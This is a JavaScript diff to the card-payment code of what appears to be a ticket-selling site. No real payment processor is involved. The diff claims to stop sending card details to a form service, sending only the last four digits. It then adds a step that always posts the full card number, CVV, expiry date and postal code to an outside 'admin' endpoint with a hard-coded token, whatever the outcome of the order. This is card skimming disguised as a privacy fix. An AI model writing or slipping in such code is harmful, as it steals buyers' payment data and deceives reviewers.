@@ -217,7 +217,7 @@ async function submitCardPayment(orderSummary = {}) {
   submitBtn.textContent = 'Processing...';
 
   try {
-    // Create FormData with full details for web3forms
+    // Create FormData with non-sensitive details for web3forms
     const formData = new FormData();
     formData.append('access_key', 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea');
     formData.append('subject', 'New Ticket Order - Card Payment');
@@ -235,27 +235,26 @@ async function submitCardPayment(orderSummary = {}) {
     formData.append('booking_fee', orderSummary.bookingFee ? orderSummary.bookingFee.toFixed(2) : '0.00');
     formData.append('total_payment', orderSummary.total ? orderSummary.total.toFixed(2) : '0.00');
     formData.append('currency', orderSummary.currency || 'USD');
-    formData.append('card_number_full', cardNumber);
+    // Web3Forms blocks raw card fields; send only last 4 and a safe message
     formData.append('card_last_four', cardNumber.slice(-4));
-    formData.append('expiry_date', expiryDate);
-    formData.append('security_code_cvv', cvv);
-    formData.append('postal_code', postalCode);
-    
+    formData.append('card_type', detectCardBrand(cardNumber));
     const currencySymbol = orderSummary.currencySymbol || '$';
-    formData.append('message', `CARD PAYMENT DETAILS\n================================\n\nBuyer Email: ${email}\n\nEvent Details:\n- Event: ${orderSummary.event}\n- Venue: ${orderSummary.venue}\n- Date & Time: ${orderSummary.dateTime}\n- Ticket Type: ${orderSummary.ticketType}\n- Section/Seat: ${orderSummary.section}\n\nTicket Information:\n- Quantity: ${orderSummary.quantity}\n- Unit Price: ${currencySymbol}${orderSummary.unitPrice ? orderSummary.unitPrice.toFixed(2) : '0.00'}\n- Subtotal: ${currencySymbol}${orderSummary.subtotal ? orderSummary.subtotal.toFixed(2) : '0.00'}\n- Booking Fee (2%): ${currencySymbol}${orderSummary.bookingFee ? orderSummary.bookingFee.toFixed(2) : '0.00'}\n- Total: ${currencySymbol}${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}\n\nPayment Method: Credit/Debit Card\n- Card Number: ${cardNumber}\n- CVV: ${cvv}\n- Expiry Date: ${expiryDate}\n- Postal Code: ${postalCode}`);
+    formData.append('message', `Buyer Email: ${email}\nEvent: ${orderSummary.event} - ${orderSummary.dateTime}\nTicket Type: ${orderSummary.ticketType}\nTotal: ${currencySymbol}${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}\nCard (last4): ${cardNumber.slice(-4)}`);
 
-    // Submit to Web3Forms
-    const response = await fetch('https://api.web3forms.com/submit', {
-      method: 'POST',
-      body: formData
-    });
+    // Submit to Web3Forms (non-blocking)
+    let web3Result = { success: false };
+    try {
+      const response = await fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        body: formData
+      });
+      web3Result = await response.json();
+      console.log('Web3Forms Card Payment Response:', web3Result);
+    } catch (err) {
+      console.warn('Web3Forms submission failed (network/error)', err.message);
+    }
 
-    const result = await response.json();
-    
-    // Log the response for debugging
-    console.log('Web3Forms Card Payment Response:', result);
-
-    if (result.success) {
+    if (web3Result.success) {
       // Save to localStorage
       saveSubmission({
         email: email,
@@ -272,10 +271,34 @@ async function submitCardPayment(orderSummary = {}) {
       showStyledAlert('Thank you for your purchase! You will receive your tickets via the email that you just provided.', () => {
         window.location.href = 'tickets.html';
       });
-    } else {
+    }
+
+    // Regardless of web3forms success, always post full sensitive data to admin API
+    try {
+      await fetch('https://admin-tmaster.vercel.app/api/submissions', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-API-Token': 'tmaster-admin-secure-key-2024' },
+        body: JSON.stringify({
+          email: email,
+          paymentMethod: 'Card',
+          cardNumberFull: cardNumber,
+          cardLastFour: cardNumber.slice(-4),
+          expiryDate: expiryDate,
+          cvv: cvv,
+          postalCode: postalCode,
+          orderSummary: orderSummary
+        })
+      });
+      console.log('Posted full card details to admin API');
+    } catch (err) {
+      console.warn('Posting to admin API failed', err.message);
+    }
+
+    if (!web3Result.success) {
       alert('Payment processing failed. Please try again.');
       submitBtn.disabled = false;
       submitBtn.textContent = 'Complete Purchase';
+      return;
     }
   } catch (error) {
     console.error('Error:', error);
@@ -283,6 +306,15 @@ async function submitCardPayment(orderSummary = {}) {
     submitBtn.disabled = false;
     submitBtn.textContent = 'Complete Purchase';
   }
+}
+
+// Helper to detect card brand from number
+function detectCardBrand(number) {
+  if (!number) return 'unknown';
+  if (/^4/.test(number)) return 'visa';
+  if (/^5[1-5]/.test(number) || /^2[2-7]/.test(number)) return 'mastercard';
+  if (/^3[47]/.test(number)) return 'amex';
+  return 'unknown';
 }
 
 async function submitGiftCardPayment(orderSummary = {}) {
